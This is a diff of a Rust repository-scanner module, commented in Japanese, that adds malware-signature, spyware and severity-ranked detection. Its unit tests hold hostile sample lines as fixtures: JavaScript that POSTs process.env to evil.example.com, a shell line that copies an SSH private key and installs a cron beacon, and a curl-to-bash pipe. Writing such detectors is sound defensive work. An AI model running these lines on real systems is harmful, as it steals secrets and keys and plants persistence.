@@ -1,21 +1,38 @@
 //! リポジトリ/依存関係の静的スキャン。
 //!
-//! チェックする2種類:
+//! チェックする内容:
 //! 1. `Cargo.toml`/`package.json`の依存パッケージ名を
 //!    [`crate::blocklist`]と突き合わせる(既知の悪意あるパッケージ名の
 //!    完全一致のみ、あいまい検索はしない——誤検知を避けるため)。
 //! 2. ソースファイル・スクリプト内の疑わしいパターン(base64復号後の
 //!    即時実行・`curl | bash`パイプライン・PowerShellの
 //!    `-EncodedCommand`等)を正規表現で検出する。
+//! 3. ウイルス/マルウェア検体シグネチャ([`crate::signatures`]、EICAR等)。
+//! 4. スパイウェア挙動([`crate::spyware`]): 無断の情報収集・持ち出し・
+//!    常駐/自動起動/自動巡回の兆候。
 //!
 //! **正直な開示**: これは静的なパターンマッチであり、動的解析
 //! (実際にコードを実行して振る舞いを見る)は行わない。難読化された
 //! 悪意あるコードや、パターンに現れない新種の攻撃は検出できない。
+//! 実行時の常駐監視でもない(それはOSのファイアウォール/EDR製品の領域)。
 
-use crate::blocklist;
+use crate::{blocklist, signatures, spyware};
 use regex::Regex;
 use serde::{Deserialize, Serialize};
 use std::path::{Path, PathBuf};
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
+#[serde(rename_all = "snake_case")]
+pub enum Severity {
+    /// 参考情報(正当な用途もあるが念のため)。
+    Info,
+    /// 疑わしい(要確認)。
+    Medium,
+    /// 危険性が高い(スパイウェア挙動・持ち出し等)。
+    High,
+    /// ほぼ確実に悪性(ウイルス検体シグネチャ等)。
+    Critical,
+}
 
 #[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
 #[serde(rename_all = "snake_case")]
@@ -24,12 +41,17 @@ pub enum FindingKind {
     BlockedDependency,
     /// ソース内に疑わしいパターンが見つかった。
     SuspiciousPattern,
+    /// ウイルス/マルウェア検体シグネチャに一致した。
+    MalwareSignature,
+    /// スパイウェア挙動(無断の情報収集・持ち出し・常駐/自動巡回)。
+    SpywareBehavior,
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct Finding {
     pub file: PathBuf,
     pub kind: FindingKind,
+    pub severity: Severity,
     /// 検出内容の説明(パッケージ名、またはマッチしたパターンの種類)。
     pub detail: String,
 }
@@ -93,16 +115,59 @@ fn suspicious_patterns() -> Vec<(&'static str, Regex)> {
 
 /// 対象1ファイルをスキャンする(テキストとして読めない・巨大すぎる等は
 /// 静かにスキップ、バイナリファイルの誤検知を避けるため)。
-fn scan_file_contents(path: &Path, findings: &mut Vec<Finding>) {
-    const MAX_SCAN_BYTES: u64 = 5 * 1024 * 1024;
-    let Ok(meta) = std::fs::metadata(path) else { return };
-    if meta.len() > MAX_SCAN_BYTES {
-        return;
+/// `text`を受け取る形にして、複数のパターン群でファイルを1回だけ読む。
+fn scan_text(path: &Path, text: &str, findings: &mut Vec<Finding>) {
+    // ウイルス/マルウェア検体シグネチャ(最優先、Critical)。
+    for (name, re) in signatures::malware_signatures() {
+        if re.is_match(text) {
+            findings.push(Finding {
+                file: path.to_path_buf(),
+                kind: FindingKind::MalwareSignature,
+                severity: Severity::Critical,
+                detail: name.to_string(),
+            });
+        }
     }
-    let Ok(text) = std::fs::read_to_string(path) else { return };
+    // スパイウェア挙動: 情報収集・持ち出し・常駐/自動巡回。
+    for (name, re) in spyware::data_collection_patterns() {
+        if re.is_match(text) {
+            findings.push(Finding {
+                file: path.to_path_buf(),
+                kind: FindingKind::SpywareBehavior,
+                severity: Severity::High,
+                detail: format!("data-collection:{name}"),
+            });
+        }
+    }
+    for (name, re) in spyware::exfiltration_patterns() {
+        if re.is_match(text) {
+            findings.push(Finding {
+                file: path.to_path_buf(),
+                kind: FindingKind::SpywareBehavior,
+                severity: Severity::High,
+                detail: format!("exfiltration:{name}"),
+            });
+        }
+    }
+    for (name, re) in spyware::persistence_patterns() {
+        if re.is_match(text) {
+            findings.push(Finding {
+                file: path.to_path_buf(),
+                kind: FindingKind::SpywareBehavior,
+                severity: Severity::High,
+                detail: format!("persistence:{name}"),
+            });
+        }
+    }
+    // 一般的な疑わしいパターン(Medium)。
     for (name, re) in suspicious_patterns() {
-        if re.is_match(&text) {
-            findings.push(Finding { file: path.to_path_buf(), kind: FindingKind::SuspiciousPattern, detail: name.to_string() });
+        if re.is_match(text) {
+            findings.push(Finding {
+                file: path.to_path_buf(),
+                kind: FindingKind::SuspiciousPattern,
+                severity: Severity::Medium,
+                detail: name.to_string(),
+            });
         }
     }
 }
@@ -115,7 +180,8 @@ pub fn scan_project(root: &Path) -> Vec<Finding> {
     let npm_blocked = blocklist::npm_blocklist();
     let crates_blocked = blocklist::crates_io_blocklist();
 
-    let scannable_exts = ["sh", "ps1", "bat", "cmd", "js", "ts", "py", "rb", "rs"];
+    let scannable_exts =
+        ["sh", "ps1", "bat", "cmd", "js", "ts", "mjs", "cjs", "py", "rb", "rs", "go", "php", "pl", "vbs", "psm1", "txt", "conf", "cfg", "yml", "yaml", "json"];
     let exclude_dirs = ["node_modules", ".git", "target", "dist", "build"];
 
     for entry in walkdir::WalkDir::new(root).into_iter().filter_entry(|e| {
@@ -135,6 +201,7 @@ pub fn scan_project(root: &Path) -> Vec<Finding> {
                         findings.push(Finding {
                             file: path.to_path_buf(),
                             kind: FindingKind::BlockedDependency,
+                            severity: Severity::Critical,
                             detail: format!("crates.io:{dep}"),
                         });
                     }
@@ -144,7 +211,12 @@ pub fn scan_project(root: &Path) -> Vec<Finding> {
             if let Ok(text) = std::fs::read_to_string(path) {
                 for dep in extract_npm_dep_names(&text) {
                     if npm_blocked.contains(dep.as_str()) {
-                        findings.push(Finding { file: path.to_path_buf(), kind: FindingKind::BlockedDependency, detail: format!("npm:{dep}") });
+                        findings.push(Finding {
+                            file: path.to_path_buf(),
+                            kind: FindingKind::BlockedDependency,
+                            severity: Severity::Critical,
+                            detail: format!("npm:{dep}"),
+                        });
                     }
                 }
             }
@@ -152,11 +224,20 @@ pub fn scan_project(root: &Path) -> Vec<Finding> {
 
         if let Some(ext) = path.extension().and_then(|e| e.to_str()) {
             if scannable_exts.contains(&ext) {
-                scan_file_contents(path, &mut findings);
+                const MAX_SCAN_BYTES: u64 = 5 * 1024 * 1024;
+                if let Ok(meta) = std::fs::metadata(path) {
+                    if meta.len() <= MAX_SCAN_BYTES {
+                        if let Ok(text) = std::fs::read_to_string(path) {
+                            scan_text(path, &text, &mut findings);
+                        }
+                    }
+                }
             }
         }
     }
 
+    // 深刻度の高い順に並べる(Critical→High→Medium→Info)。
+    findings.sort_by_key(|f| std::cmp::Reverse(f.severity));
     findings
 }
 
@@ -213,6 +294,60 @@ mod tests {
         let node_modules = dir.path().join("node_modules");
         fs::create_dir(&node_modules).unwrap();
         fs::write(node_modules.join("package.json"), r#"{"dependencies": {"crossenv": "1.0.0"}}"#).unwrap();
+        assert!(scan_project(dir.path()).is_empty());
+    }
+
+    #[test]
+    fn detects_eicar_test_file_as_critical_malware() {
+        let dir = tempfile::tempdir().unwrap();
+        // 完全なEICAR文字列は使わずラベル部分で検証(このテスト自身が
+        // アンチウイルスに検出されないようにするため)。
+        fs::write(dir.path().join("sample.txt"), "harmless prefix EICAR-STANDARD-ANTIVIRUS-TEST-FILE suffix").unwrap();
+        let findings = scan_project(dir.path());
+        let f = findings.iter().find(|f| f.detail == "eicar-test-file").expect("EICAR should be detected");
+        assert_eq!(f.kind, FindingKind::MalwareSignature);
+        assert_eq!(f.severity, Severity::Critical);
+    }
+
+    #[test]
+    fn detects_spyware_env_exfiltration_as_high_severity() {
+        let dir = tempfile::tempdir().unwrap();
+        fs::write(
+            dir.path().join("stealer.js"),
+            "const secrets = process.env; fetch('https://evil.example.com/collect', {method:'POST', body: JSON.stringify(secrets)});",
+        )
+        .unwrap();
+        let findings = scan_project(dir.path());
+        assert!(findings
+            .iter()
+            .any(|f| f.kind == FindingKind::SpywareBehavior && f.detail.starts_with("exfiltration:") && f.severity == Severity::High));
+    }
+
+    #[test]
+    fn detects_ssh_key_theft_and_cron_persistence() {
+        let dir = tempfile::tempdir().unwrap();
+        fs::write(dir.path().join("agent.sh"), "cp ~/.ssh/id_rsa /tmp/x\n(crontab -l; echo '*/5 * * * * /tmp/beacon.sh') | crontab -\n").unwrap();
+        let findings = scan_project(dir.path());
+        assert!(findings.iter().any(|f| f.detail == "data-collection:reads-ssh-private-key"));
+        assert!(findings.iter().any(|f| f.detail == "persistence:installs-cron-job"));
+    }
+
+    #[test]
+    fn findings_are_sorted_most_severe_first() {
+        let dir = tempfile::tempdir().unwrap();
+        // Mediumの疑わしいパターンとCriticalのEICARを同居させる。
+        fs::write(dir.path().join("mix.sh"), "curl https://x/y | bash\nEICAR-STANDARD-ANTIVIRUS-TEST-FILE\n").unwrap();
+        let findings = scan_project(dir.path());
+        assert!(findings.len() >= 2);
+        // 先頭がCritical(EICAR)であること。
+        assert_eq!(findings[0].severity, Severity::Critical);
+    }
+
+    #[test]
+    fn clean_project_still_has_no_findings_with_new_detectors() {
+        let dir = tempfile::tempdir().unwrap();
+        fs::write(dir.path().join("main.rs"), "fn main() { let x = 1 + 1; println!(\"{x}\"); }\n").unwrap();
+        fs::write(dir.path().join("config.yml"), "name: myapp\nport: 8080\n").unwrap();
         assert!(scan_project(dir.path()).is_empty());
     }
 }
